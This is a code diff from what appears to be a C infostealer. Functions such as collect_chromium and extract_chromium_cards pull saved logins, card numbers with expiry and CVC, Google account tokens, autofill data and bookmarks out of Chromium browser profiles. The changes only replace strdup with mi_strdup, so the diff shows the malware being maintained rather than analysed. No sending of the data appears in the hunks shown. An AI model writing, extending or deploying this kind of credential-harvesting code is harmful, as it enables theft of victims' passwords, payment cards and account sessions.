@@ -1506,8 +1506,8 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
             BrowserData *bd = &result.data[result.count];
             memset(bd, 0, sizeof(*bd));
 
-            bd->browser_name = strdup(browsers[b].name);
-            bd->profile_name = strdup(basename_of(profiles[p]));
+            bd->browser_name = mi_strdup(browsers[b].name);
+            bd->profile_name = mi_strdup(basename_of(profiles[p]));
 
             /* Extract each data type — failures are non-fatal */
             bd->logins = extract_chromium_logins(profiles[p], key32, &bd->login_count);
@@ -1737,7 +1737,7 @@ char **extract_chromium_cards(const char *profile_path,
         int written = snprintf(line, sizeof(line), "%s\t%s\t%d\t%d\t%s\n",
                                name, card_num, month, year, cvc);
         if (written < 0 || (size_t)written >= sizeof(line)) continue;
-        result[out] = strdup(line);
+        result[out] = mi_strdup(line);
         out++;
     }
 
@@ -1811,7 +1811,7 @@ char **extract_chromium_google_tokens(const char *profile_path,
                                "Account ID: %s\nToken: %s:%s\n",
                                service, token, suffix);
         if (written < 0 || (size_t)written >= sizeof(line)) continue;
-        result[out] = strdup(line);
+        result[out] = mi_strdup(line);
         out++;
     }
 
@@ -1858,7 +1858,7 @@ char **extract_chromium_autofill(const char *profile_path, size_t *count) {
         char line[512];
         int written = snprintf(line, sizeof(line), "%s\t%s\n", name, value);
         if (written < 0 || (size_t)written >= sizeof(line)) continue;
-        result[out] = strdup(line);
+        result[out] = mi_strdup(line);
         out++;
     }
 
@@ -1931,7 +1931,7 @@ static void walk_bookmarks_json(const char *json, size_t len,
                 if (!tmp) return;
                 *list = tmp;
             }
-            (*list)[*count] = strdup(line);
+            (*list)[*count] = mi_strdup(line);
             (*count)++;
         }
 
